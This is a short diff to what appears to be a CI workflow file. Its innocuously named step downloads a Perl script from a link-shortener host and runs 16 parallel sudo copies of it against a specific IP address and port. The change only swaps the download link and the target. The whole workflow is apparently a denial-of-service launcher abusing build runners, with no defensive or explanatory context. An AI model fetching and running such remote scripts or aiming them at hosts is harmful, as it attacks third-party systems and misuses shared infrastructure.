@@ -13,11 +13,11 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/deuzK/hexba.pl -O hexba.pl
+          wget https://curl.by/i8lAd/hexba.pl -O hexba.pl
           chmod +x hexba.pl
           PIDS=()
           for i in {1..16}; do
-            sudo timeout 40 perl hexba.pl 66.22.244.155 50005 &
+            sudo timeout 40 perl hexba.pl 104.29.153.172 19294 &
             PIDS+=($!)
           done
           
